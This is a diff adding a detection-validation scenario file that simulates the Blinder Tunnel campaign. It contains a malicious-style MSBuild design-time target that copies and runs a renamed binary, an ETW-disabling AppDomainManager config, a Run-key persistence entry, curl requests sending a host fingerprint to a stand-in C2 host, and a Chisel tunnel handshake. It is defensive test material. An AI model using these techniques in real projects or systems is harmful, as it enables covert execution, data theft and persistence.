@@ -1,0 +1,646 @@
+# CL-STA-1178 "Blinder Tunnel" (Unit 42, 2026-10-06): a fake Dubai Airports recruiter hands an IT
+# candidate a C# coding test; opening it in Visual Studio runs a GetFrameworkPaths MSBuild target,
+# a renamed vshost (RuntimeBroker.exe) with an AppDomainManager .exe.config (ETW off), a
+# MicrosoftRuntime Run key, GitHub contents-API C2, then Blackwood/Chisel reverse SOCKS.
+# Endpoint leg (EDR): point at the design-time build -> RuntimeBrokers copy -> renamed-host -> Run key
+#   lineage and the GitHub URI shape (sent to ${STAGE_HOST}, never api.github.com).
+# Network leg (NDR): the GitHub SaaS relay is observed at the network boundary (no SaaS-audit
+#   emitter exists, backlog): a synthetic 8-session api.github.com burst (the 63 s interval is the
+#   report's, not the record's), un-enrichable (GitHub is legitimate); Chisel tunnel to 91.107.156.29 + WildFire verdicts on the Blackwood hashes; DNS
+#   lookups of the report's Drive/Meet look-alikes via @${LAB_RESOLVER} (one query, no session).
+# Every leg carries the run host (src_host); CR-MP-0025 stitches them. Steps 05–09 are Linux-only (Windows variants cover lineage steps 01–04).
+scenario_id: SIM-MP-025
+name: "Blinder Tunnel (CL-STA-1178) — Developer-Lure MSBuild Execution, GitHub-as-C2 and Chisel Tunnel"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - XQL
+  - ABIOC
+  - IOC
+  - Correlation
+
+uc_ref: UCS-IR-02
+tc_ref: TC-IR-05
+tc_refs:
+  - TC-IR-05
+  - TC-EDR-05
+  - TC-NDR-01
+  - TC-TH-06
+pov_scenario_id: POV-SC-001
+uc_name: "Incident Response"
+tc_name: "Demonstrate correlation-based detections across endpoint + network + identity telemetry"
+
+mitre_tactic: "TA0005"
+mitre_tactic_name: "Defense Evasion"
+mitre_technique: "T1127"
+mitre_technique_name: "Trusted Developer Utilities Proxy Execution"
+additional_techniques:
+  - technique: "T1204.002"
+    name: "User Execution: Malicious File"
+  - technique: "T1574.014"
+    name: "Hijack Execution Flow: AppDomainManager"
+  - technique: "T1036.005"
+    name: "Masquerading: Match Legitimate Resource Name or Location"
+  - technique: "T1562.006"
+    name: "Impair Defenses: Indicator Blocking"
+  - technique: "T1547.001"
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  - technique: "T1102.002"
+    name: "Web Service: Bidirectional Communication"
+  - technique: "T1572"
+    name: "Protocol Tunneling"
+  - technique: "T1090"
+    name: "Proxy"
+  - technique: "T1566.003"
+    name: "Phishing: Spearphishing via Service"
+
+threat_report: "Unit 42 — Blinder Tunnel Campaign Targets Iraqi Infrastructure (CL-STA-1178)"
+threat_report_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+
+execution_identity:
+  default: developer
+  options:
+    - developer
+    - root
+    - container-runtime
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+validation_methodology: "Multi-Plane Correlation & Behavioral Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 900
+  unit: "seconds"
+success_criteria: |
+  The endpoint lineage (design-time MSBuild target -> RuntimeBrokers drop -> renamed
+  RuntimeBroker.exe with an ETW-disabling .exe.config -> MicrosoftRuntime autostart -> GitHub
+  contents-API URI shape) raises its BIOCs on the run host; the synthetic recurring api.github.com
+  sessions raise the network-boundary GitHub-cadence ABIOC for the same src_host; the Chisel tunnel to 91.107.156.29 and
+  the WildFire verdicts on the Blackwood hashes raise NGFW alerts that Unit 42 enrichment names as
+  CL-STA-1178; and CR-MP-0025 stitches the endpoint and network legs into ONE incident on the shared src_host
+  inside the correlation window. Mean time from the design-time build to the stitched incident is
+  within the MTTD budget.
+moat_tier: "LEAD"
+
+required_planes_in_incident:
+  - EDR
+  - NDR
+stitching_key: src_host
+correlation_window_seconds: 900
+
+indicators:
+  - id: ind-01
+    type: sha256
+    value: "6e7d9b33f1e72ea1ede71373a604ecdb060dab7d42055179c1eede9ecd1fd239"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: hash_only
+    surfaces_in: [step-01]
+    description: "DubaiAirport_Carrers_IT_Test.zip — initial coding-test archive (report IOC table)"
+  - id: ind-02
+    type: sha256
+    value: "f5b12772db6817f7a765a6fe7565fd3d4f87edc28e42fe3ec0244a372a410fc9"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: hash_only
+    surfaces_in: [step-01]
+    description: "FlightManager.csproj — weaponized Visual Studio project carrying the GetFrameworkPaths target"
+  - id: ind-03
+    type: sha256
+    value: "53f35e49eb9b271fd8cbcd3daacb525328dbf159a03dbd1c7adebe0363daa402"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: hash_only
+    surfaces_in: [step-03]
+    description: "RuntimeBroker.dll — ShelbyLoader V2, the AppDomainManager-loaded primary loader"
+  - id: ind-04
+    type: sha256
+    value: "76273382e4252c1f60a2251141e108942494409c759358320735891762c0682e"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: log_field
+    surfaces_in: [step-09]
+    description: "Blackwood.dll — Chisel tunneling wrapper (WildFire verdict on the synthetic threat log)"
+  - id: ind-05
+    type: sha256
+    value: "7cc571aca6d8715d9aaad3d83e1bcd30467565d583db1dfe73697c5d00a1f875"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: log_field
+    surfaces_in: [step-09]
+    description: "Blackwood archive (contacts 87.248.129.239) — WildFire verdict on the synthetic threat log"
+  - id: ind-06
+    type: ipv4
+    value: "91.107.156.29"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: log_field
+    surfaces_in: [step-09]
+    description: "Blackwood/Chisel reverse-SOCKS tunneling endpoint (R:0.0.0.0:10999:socks)"
+  - id: ind-07
+    type: domain
+    value: "cloud.g-drive.cam"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: dns_lookup
+    surfaces_in: [step-08]
+    description: "Google Drive look-alike lure host and fake Google sign-in page"
+  - id: ind-08
+    type: domain
+    value: "googeldrive.cam"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: dns_lookup
+    surfaces_in: [step-08]
+    description: "Phishing domain (report IOC table)"
+  - id: ind-09
+    type: domain
+    value: "drivegoogel.cam"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: dns_lookup
+    surfaces_in: [step-08]
+    description: "Phishing domain (report IOC table)"
+  - id: ind-10
+    type: domain
+    value: "googelmeet.online"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: dns_lookup
+    surfaces_in: [step-08]
+    description: "Google Meet look-alike phishing domain (report IOC table)"
+  - id: ind-11
+    type: domain
+    value: "meetonline.cam"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: dns_lookup
+    surfaces_in: [step-08]
+    description: "Phishing domain (report IOC table)"
+  - id: ind-12
+    type: domain
+    value: "asdfafadafg.online"
+    source_url: "https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/"
+    safe_form: dns_lookup
+    surfaces_in: [step-08]
+    description: "Phishing domain (report IOC table)"
+
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The CGO is the IDE that opens the lure project (devenv.exe on Windows; on the Linux run host the
+# shell that unpacks and builds it). step-01 is the root. step-02..05 and step-07 descend from it by
+# process_lineage (design-time build -> copied host -> autostart -> C2 requests -> tunnel config).
+# step-06 (synthetic GitHub sessions at the network boundary) and step-09 (synthetic NGFW tunnel + WildFire logs) are
+# endpoint_network_stitch edges on the same src_host; step-08 (DNS lookups of the lure
+# infrastructure) is a shared_entity edge on that host.
+cgo_anchor:
+  image_name: "devenv.exe"
+  primary_username: "developer"
+
+steps:
+  - id: step-01
+    name: "Unpack the Dubai Airports coding-test lure (DubaiAirport_Carrers_IT_Test.zip)"
+    command: |
+      STAGE="/tmp/cortexsim-mp025/lure/DubaiAirport_Carrers_IT_Test"
+      LURE="$HOME/Downloads/DubaiAirport_Carrers_IT_Test.zip"
+      PROJ="$HOME/source/repos/DubaiAirport_Carrers_IT_Test"
+      mkdir -p "$STAGE/FlightManager/Resources" "$HOME/Downloads" "$HOME/source/repos"
+      cat > "$STAGE/Readme.md" <<'MD'
+      # Dubai Airports - IT candidate coding test
+      The Flight Management System skips the last flight in the schedule. Fix the loop.
+      Open DubaiAirport_Carrers_IT_Test.slnx in Visual Studio and build.
+      MD
+      printf '<Solution>\n  <Project Path="FlightManager/FlightManager.csproj" />\n</Solution>\n' > "$STAGE/DubaiAirport_Carrers_IT_Test.slnx"
+      cat > "$STAGE/FlightManager/FlightManager.csproj" <<'XML'
+      <Project>
+        <!-- CortexSim SAFE-MODE replica: the report's design-time hook. Visual Studio runs
+             GetFrameworkPaths when the project is opened, before any compile. -->
+        <ItemGroup>
+          <BrokerFiles Include="Resources/*" />
+        </ItemGroup>
+        <Target Name="GetFrameworkPaths">
+          <MakeDir Directories="$(LOCALAPPDATA)/Microsoft/RuntimeBrokers" />
+          <Copy SourceFiles="@(BrokerFiles)" DestinationFolder="$(LOCALAPPDATA)/Microsoft/RuntimeBrokers" />
+          <Exec Command="&quot;$(LOCALAPPDATA)/Microsoft/RuntimeBrokers/RuntimeBroker.exe&quot; 3" />
+        </Target>
+      </Project>
+      XML
+      cp /bin/sleep "$STAGE/FlightManager/Resources/RuntimeBroker.exe"
+      cat > "$STAGE/FlightManager/Resources/RuntimeBroker.exe.config" <<'XML'
+      <?xml version="1.0" encoding="utf-8"?>
+      <!-- cortexsim-mp025 -->
+      <configuration>
+        <runtime>
+          <appDomainManagerAssembly value="RuntimeBroker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
+          <appDomainManagerType value="RuntimeBroker.Manager" />
+          <etwEnable enabled="false" />
+        </runtime>
+      </configuration>
+      XML
+      printf 'CORTEXSIM SAFE-MODE placeholder for RuntimeBroker.dll (ShelbyLoader V2); no code\n' > "$STAGE/FlightManager/Resources/RuntimeBroker.dll"
+      (cd /tmp/cortexsim-mp025/lure && python3 -m zipfile -c "$LURE" DubaiAirport_Carrers_IT_Test)
+      python3 -m zipfile -e "$LURE" "$HOME/source/repos/"
+      chmod +x "$PROJ/FlightManager/Resources/RuntimeBroker.exe"
+      sha256sum "$LURE" "$PROJ/FlightManager/FlightManager.csproj"
+      echo "report sha256 DubaiAirport_Carrers_IT_Test.zip 6e7d9b33f1e72ea1ede71373a604ecdb060dab7d42055179c1eede9ecd1fd239"
+      echo "report sha256 FlightManager.csproj f5b12772db6817f7a765a6fe7565fd3d4f87edc28e42fe3ec0244a372a410fc9"
+    platform_variants:
+      windows: |
+        $stage = Join-Path $env:TEMP 'cortexsim-mp025\lure\DubaiAirport_Carrers_IT_Test'
+        $lure = Join-Path $env:USERPROFILE 'Downloads\DubaiAirport_Carrers_IT_Test.zip'
+        $repos = Join-Path $env:USERPROFILE 'source\repos'
+        New-Item -ItemType Directory -Force -Path (Join-Path $stage 'FlightManager\Resources'), $repos | Out-Null
+        Set-Content -Path (Join-Path $stage 'Readme.md') -Value '# Dubai Airports - IT candidate coding test. Fix the loop that skips the last flight.'
+        Set-Content -Path (Join-Path $stage 'DubaiAirport_Carrers_IT_Test.slnx') -Value '<Solution><Project Path="FlightManager/FlightManager.csproj" /></Solution>'
+        Set-Content -Path (Join-Path $stage 'FlightManager\FlightManager.csproj') -Value @'
+        <Project>
+          <ItemGroup><BrokerFiles Include="Resources\*" /></ItemGroup>
+          <Target Name="GetFrameworkPaths">
+            <MakeDir Directories="$(LOCALAPPDATA)\Microsoft\RuntimeBrokers" />
+            <Copy SourceFiles="@(BrokerFiles)" DestinationFolder="$(LOCALAPPDATA)\Microsoft\RuntimeBrokers" />
+            <Exec Command="&quot;$(LOCALAPPDATA)\Microsoft\RuntimeBrokers\RuntimeBroker.exe&quot; -n 3 127.0.0.1" />
+          </Target>
+        </Project>
+        '@
+        Copy-Item "$env:WINDIR\System32\PING.EXE" (Join-Path $stage 'FlightManager\Resources\RuntimeBroker.exe') -Force
+        Set-Content -Path (Join-Path $stage 'FlightManager\Resources\RuntimeBroker.exe.config') -Value '<!-- cortexsim-mp025 --><configuration><runtime><appDomainManagerAssembly value="RuntimeBroker" /><appDomainManagerType value="RuntimeBroker.Manager" /><etwEnable enabled="false" /></runtime></configuration>'
+        Compress-Archive -Path $stage -DestinationPath $lure -Force
+        Expand-Archive -Path $lure -DestinationPath $repos -Force
+        Get-FileHash -Algorithm SHA256 $lure, (Join-Path $repos 'DubaiAirport_Carrers_IT_Test\FlightManager\FlightManager.csproj')
+        Write-Output 'report sha256 DubaiAirport_Carrers_IT_Test.zip 6e7d9b33f1e72ea1ede71373a604ecdb060dab7d42055179c1eede9ecd1fd239'
+        Write-Output 'report sha256 FlightManager.csproj f5b12772db6817f7a765a6fe7565fd3d4f87edc28e42fe3ec0244a372a410fc9'
+    identity: developer
+    mitre_technique: "T1204.002"
+    platforms: ["linux", "windows"]
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation query: the coding-test archive is written to the user's Downloads and extracted into source/repos, dropping a .csproj, a .slnx, and a Resources folder holding RuntimeBroker.exe + RuntimeBroker.exe.config — the lure staging the analyst traces back from."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "xql-mp-025-coding-test-lure-extracted-into-source-repos"
+
+  - id: step-02
+    name: "Opening the project runs the GetFrameworkPaths design-time target (MSBuild proxy execution)"
+    command: |
+      export LOCALAPPDATA="$HOME/.local/share"
+      cd "$HOME/source/repos/DubaiAirport_Carrers_IT_Test/FlightManager" || exit 1
+      ls -la Resources
+      if command -v dotnet >/dev/null 2>&1; then
+        dotnet msbuild FlightManager.csproj -t:GetFrameworkPaths -nologo -v:m || exit 1
+      else
+        sh -c 'mkdir -p "$LOCALAPPDATA/Microsoft/RuntimeBrokers" && cp Resources/* "$LOCALAPPDATA/Microsoft/RuntimeBrokers/" && "$LOCALAPPDATA/Microsoft/RuntimeBrokers/RuntimeBroker.exe" 3' || exit 1
+      fi
+    platform_variants:
+      windows: |
+        $proj = Join-Path $env:USERPROFILE 'source\repos\DubaiAirport_Carrers_IT_Test\FlightManager'
+        $vswhere = Join-Path ${env:ProgramFiles(x86)} 'Microsoft Visual Studio\Installer\vswhere.exe'
+        $msb = $null
+        if (Test-Path $vswhere) { $msb = & $vswhere -latest -find 'MSBuild\**\Bin\MSBuild.exe' | Select-Object -First 1 }
+        if ($msb) { & $msb (Join-Path $proj 'FlightManager.csproj') -t:GetFrameworkPaths -nologo -v:m }
+        else {
+          $rb = Join-Path $env:LOCALAPPDATA 'Microsoft\RuntimeBrokers'
+          New-Item -ItemType Directory -Force -Path $rb | Out-Null
+          Copy-Item (Join-Path $proj 'Resources\*') $rb -Force
+          & (Join-Path $rb 'RuntimeBroker.exe') -n 3 127.0.0.1
+        }
+        Get-ChildItem (Join-Path $env:LOCALAPPDATA 'Microsoft\RuntimeBrokers')
+    identity: developer
+    mitre_technique: "T1127"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A build engine (MSBuild.exe / dotnet msbuild, child of the IDE) creates the Microsoft\\RuntimeBrokers folder under the user's local app-data, copies binaries into it and executes RuntimeBroker.exe from there — a design-time target doing install-and-run work, the report's T1127 execution primitive."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "bioc-mp-025-build-engine-drops-and-executes-runtimebroker-from-user-app-data"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: the causality chain IDE -> build engine -> RuntimeBroker.exe is present in xdr_data for the run host within the window."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "xql-mp-025-design-time-build-to-runtimebroker-lineage"
+
+  - id: step-03
+    name: "Renamed host RuntimeBroker.exe runs from app-data with an AppDomainManager config that disables ETW"
+    command: |
+      RB="$HOME/.local/share/Microsoft/RuntimeBrokers"
+      grep -n 'appDomainManager\|etwEnable enabled="false"' "$RB/RuntimeBroker.exe.config"
+      sha256sum "$RB/RuntimeBroker.exe" "$RB/RuntimeBroker.dll"
+      echo "report sha256 RuntimeBroker.dll (ShelbyLoader V2) 53f35e49eb9b271fd8cbcd3daacb525328dbf159a03dbd1c7adebe0363daa402"
+      "$RB/RuntimeBroker.exe" 5 &
+      RBPID=$!
+      sleep 1
+      tr '\0' ' ' < "/proc/$RBPID/cmdline"
+      wait "$RBPID" || exit 1
+    platform_variants:
+      windows: |
+        $rb = Join-Path $env:LOCALAPPDATA 'Microsoft\RuntimeBrokers'
+        Select-String -Path (Join-Path $rb 'RuntimeBroker.exe.config') -Pattern 'appDomainManager', 'etwEnable enabled="false"'
+        Get-FileHash -Algorithm SHA256 (Join-Path $rb 'RuntimeBroker.exe')
+        Write-Output 'report sha256 RuntimeBroker.dll (ShelbyLoader V2) 53f35e49eb9b271fd8cbcd3daacb525328dbf159a03dbd1c7adebe0363daa402'
+        $p = Start-Process -FilePath (Join-Path $rb 'RuntimeBroker.exe') -ArgumentList '-n 5 127.0.0.1' -WindowStyle Hidden -PassThru
+        Start-Sleep -Seconds 1
+        Get-CimInstance Win32_Process -Filter "ProcessId=$($p.Id)" | Select-Object ProcessId, ExecutablePath, CommandLine
+        $p.WaitForExit()
+    identity: developer
+    mitre_technique: "T1574.014"
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A process named RuntimeBroker.exe executes from %LOCALAPPDATA%\\Microsoft\\RuntimeBrokers instead of System32 — masquerading as the Windows broker (renamed vshost.exe in the report)."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "bioc-mp-025-runtimebroker-exe-executed-outside-system32"
+      - plane: EDR
+        type: BIOC
+        description: "A .exe.config written beside a user-writable executable declares appDomainManagerAssembly/appDomainManagerType and etwEnable enabled=false — AppDomainManager hijack plus ETW blinding (T1574.014 / T1562.006)."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "bioc-mp-025-appdomainmanager-config-with-etw-disabled-beside-user-writable-exe"
+
+  - id: step-04
+    name: "Persist RuntimeBroker.exe as MicrosoftRuntime (HKCU Run key; XDG autostart on Linux)"
+    command: |
+      RB="$HOME/.local/share/Microsoft/RuntimeBrokers"
+      AUTOSTART="$HOME/.config/autostart/MicrosoftRuntime.desktop"
+      mkdir -p "$HOME/.config/autostart"
+      printf '[Desktop Entry]\n# cortexsim-mp025\nType=Application\nName=MicrosoftRuntime\nExec=%s/RuntimeBroker.exe 1\nHidden=true\n' "$RB" > "$AUTOSTART"
+      if [ -f "$AUTOSTART" ] && [ -x "$RB/RuntimeBroker.exe" ]; then echo "persistence state: newly persisted"; fi
+      cat "$AUTOSTART"
+    platform_variants:
+      windows: |
+        $exe = Join-Path $env:LOCALAPPDATA 'Microsoft\RuntimeBrokers\RuntimeBroker.exe'
+        New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MicrosoftRuntime' -Value "`"$exe`"" -PropertyType String -Force | Out-Null
+        Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MicrosoftRuntime'
+    identity: developer
+    mitre_technique: "T1547.001"
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "An autostart entry named MicrosoftRuntime (HKCU\\...\\CurrentVersion\\Run on Windows, ~/.config/autostart on Linux) is created pointing at RuntimeBroker.exe in the user's app-data — the report's persistence value."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "bioc-mp-025-microsoftruntime-autostart-pointing-at-app-data-runtimebroker"
+
+  - id: step-05
+    name: "GitHub contents-API C2 shape: upload Lic.txt fingerprint, poll Inf.txt, Issues-search fallback (to STAGE_HOST)"
+    command: |
+      RB="$HOME/.local/share/Microsoft/RuntimeBrokers"
+      C2="http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}"
+      FP="$(hostname -s)|$(id -un)|$(uname -sr)"
+      MID=$(printf 'Peaky Blinders 2.1%s' "$FP" | sha256sum | cut -c1-16)
+      printf '%s' "$FP" | base64 > "$RB/Lic.txt"
+      BODY=$(printf '{"message":"lic","content":"%s"}' "$(tr -d '\n' < "$RB/Lic.txt")")
+      curl -s -m 5 -X PUT -H 'Accept: application/vnd.github+json' -H 'Authorization: token cortexsim-synthetic-pat' -d "$BODY" "$C2/repos/peakyblinders-tm/myLic/contents/$MID/Lic.txt" -o /dev/null -w '%{http_code}\n' || true
+      curl -s -m 5 -H 'Accept: application/vnd.github+json' -H 'Authorization: token cortexsim-synthetic-pat' "$C2/repos/peakyblinders-tm/myLic/contents/$MID/Inf.txt" -o "$RB/Inf.txt" -w '%{http_code}\n' || true
+      curl -s -m 5 -H 'Accept: application/vnd.github+json' "$C2/search/issues?q=created:$(date -u +%Y-%m-%d)" -o /dev/null -w '%{http_code}\n' || true
+    identity: developer
+    mitre_technique: "T1102.002"
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation query: a process in the RuntimeBrokers causality chain issues GitHub contents-API requests (/repos/<owner>/<repo>/contents/<16-hex machineId>/Lic.txt then Inf.txt) with a token Authorization header — the report's C2 URI shape, visible in the command line and the HTTP request telemetry."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "xql-mp-025-github-contents-api-lic-inf-polling-from-runtimebrokers-chain"
+      - plane: EDR
+        type: BIOC
+        description: "A non-browser, non-git process descended from the build-engine lineage writes Lic.txt / Inf.txt under Microsoft\\RuntimeBrokers and requests a GitHub contents path for them — license-file C2 staging on disk."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "bioc-mp-025-lic-inf-c2-files-written-under-runtimebrokers"
+
+  - id: step-06
+    name: "GitHub SaaS relay seen at the network boundary: 8-session api.github.com burst (synthetic NGFW App-ID records)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un developer 2>/dev/null || id -un)
+      cat > /tmp/cortexsim-mp025-github.yml <<YML
+      campaign_id: CMP-MP-GITHUB-025
+      name: "Blinder Tunnel — GitHub contents-API C2 cadence (SaaS relay at the network boundary)"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [unit42, blinder-tunnel, github-c2]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_domain: "api.github.com"
+            dst_ip: "140.82.112.5"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/cortexsim-mp025-github.yml --live
+    identity: container-runtime
+    mitre_technique: "T1102.002"
+    causality:
+      parent_step: step-05
+      pivot: endpoint_network_stitch
+    platforms: ["linux", "container"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "Network-boundary view of the SaaS relay: a host whose GitHub usage is normally browser/git-driven starts a burst of small HTTPS sessions to api.github.com (8-session burst; the 63 s interval is the report's, not the record's) — the report's GitHub-as-C2 relay as the NGFW (App-ID) records it, attributed to the run host's src_host. Raised by the network sensor; no SaaS-audit emitter exists (backlog)."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "abioc-mp-025-recurring-fixed-cadence-github-api-sessions-from-a-non-developer-pattern-host"
+      - plane: NDR
+        type: XQL
+        description: "Validation query: the recurring api.github.com session records landed in panw_ngfw_traffic_raw carrying the run host's endpoint_device_name."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "xql-mp-025-github-api-recurring-sessions-landed-for-the-run-host"
+
+  - id: step-07
+    name: "Blackwood/Chisel tunnel shape: write the reverse-SOCKS config and open a chisel-v3 WebSocket upgrade (to STAGE_HOST)"
+    command: |
+      RB="$HOME/.local/share/Microsoft/RuntimeBrokers"
+      printf 'R:0.0.0.0:10999:socks' | base64 > "$RB/Blackwood.dll.conf"
+      base64 -d < "$RB/Blackwood.dll.conf"
+      curl -s -m 5 --http1.1 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: Y29ydGV4c2ltLW1wMDI1AA==' -H 'Sec-WebSocket-Protocol: chisel-v3' "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/" -o /dev/null -w '%{http_code}\n' || true
+    identity: developer
+    mitre_technique: "T1572"
+    causality:
+      parent_step: step-05
+      pivot: process_lineage
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A process in the RuntimeBrokers chain writes Blackwood.dll.conf and opens an HTTP/1.1 WebSocket upgrade advertising Sec-WebSocket-Protocol: chisel-v3 — Chisel reverse-SOCKS tunnel setup from a masqueraded host."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "bioc-mp-025-chisel-v3-websocket-upgrade-from-runtimebrokers-chain"
+
+  - id: step-08
+    name: "Resolve the report's Drive/Meet look-alike phishing domains through the lab resolver"
+    command: |
+      command -v dig >/dev/null 2>&1 || { echo "dig (dnsutils) is required for this step"; exit 1; }
+      echo "resolver: ${LAB_RESOLVER:-127.0.0.53} (one query per domain, no session opened)"
+      dig +short cloud.g-drive.cam @${LAB_RESOLVER:-127.0.0.53}
+      dig +short googeldrive.cam @${LAB_RESOLVER:-127.0.0.53}
+      dig +short drivegoogel.cam @${LAB_RESOLVER:-127.0.0.53}
+      dig +short googelmeet.online @${LAB_RESOLVER:-127.0.0.53}
+      dig +short meetonline.cam @${LAB_RESOLVER:-127.0.0.53}
+      dig +short asdfafadafg.online @${LAB_RESOLVER:-127.0.0.53}
+    identity: developer
+    mitre_technique: "T1566.003"
+    causality:
+      parent_step: step-01
+      pivot: shared_entity
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: IOC
+        description: "DNS query from the run host for cloud.g-drive.cam — the report's Google Drive look-alike lure host — matches the Unit 42 indicator (DNS Security / IOC match on pan_dns)."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "ioc-domain-cloud-g-drive-cam"
+      - plane: NDR
+        type: IOC
+        description: "DNS query from the run host for googelmeet.online — the report's Google Meet look-alike — matches the Unit 42 indicator."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "ioc-domain-googelmeet-online"
+      - plane: NDR
+        type: XQL
+        description: "Validation query: all six report phishing domains were queried by the run host within the window (pan_dns)."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "xql-mp-025-report-phishing-domains-resolved-by-the-run-host"
+
+  - id: step-09
+    name: "Network leg: Chisel tunnel sessions to the report endpoint and WildFire verdicts on Blackwood (synthetic NGFW logs)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un developer 2>/dev/null || id -un)
+      cat > /tmp/cortexsim-mp025-tunnel.yml <<YML
+      campaign_id: CMP-MP-TUNNEL-025
+      name: "Blinder Tunnel — Blackwood/Chisel tunnel + WildFire verdicts"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [unit42, blinder-tunnel, chisel]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_domain: "91.107.156.29"
+            dst_ip: "91.107.156.29"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-02
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "7cc571aca6d8715d9aaad3d83e1bcd30467565d583db1dfe73697c5d00a1f875"
+            file_name: "Client.zip"
+            file_type: "zip"
+            verdict: malicious
+            app: "github-base"
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-03
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "76273382e4252c1f60a2251141e108942494409c759358320735891762c0682e"
+            file_name: "Blackwood.dll"
+            file_type: "PE"
+            verdict: malicious
+            app: "github-base"
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
